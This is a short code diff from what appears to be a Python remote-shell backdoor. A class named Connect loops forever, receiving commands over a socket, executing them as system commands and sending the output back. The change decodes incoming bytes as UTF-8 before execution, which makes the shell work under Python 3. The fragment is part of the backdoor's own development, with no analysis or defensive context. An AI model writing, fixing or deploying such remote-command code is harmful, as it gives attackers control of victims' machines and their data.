@@ -19,7 +19,7 @@ class Connect:
     def run(self):
         while True:
             command = self.connection.recv(1024)
-            command_result = self.execute_system_command(command)
+            command_result = self.execute_system_command(command.decode('utf-8'))
             self.connection.send(command_result)
 
 
